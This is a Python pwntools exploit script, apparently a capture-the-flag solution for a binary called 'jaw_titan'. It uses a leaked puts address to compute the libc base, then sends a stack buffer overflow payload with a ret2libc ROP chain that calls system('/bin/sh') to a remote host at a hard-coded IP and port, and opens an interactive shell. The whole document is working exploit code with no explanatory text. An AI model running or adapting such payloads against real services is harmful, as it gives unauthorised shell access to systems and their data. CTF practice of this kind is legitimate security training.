from pwn import *

chall_file = './jaw_titan'
libc_file = './libc.so.6'

elf = context.binary = ELF(chall_file)
libc = ELF(libc_file)


if args.LOCAL:
   r = process()
   gdb.attach(r)
else:
   ip = '34.47.134.251'
   port = '5010'
   r = remote(ip,port)

r.recvuntil(b'this new world ')
libc.address = int(r.recvline()[:-1].decode(),16)-libc.sym.puts  
system = libc.sym.system
print(hex(libc.address))
binsh = next(libc.search(b'/bin/sh\0'))
rop = ROP(libc)
ret = rop.ret[0]
rdi = rop.rdi[0]
payload = cyclic(104) + pack(rdi) + pack(binsh) +pack(ret) + pack(system)
r.sendline(payload)
r.interactive()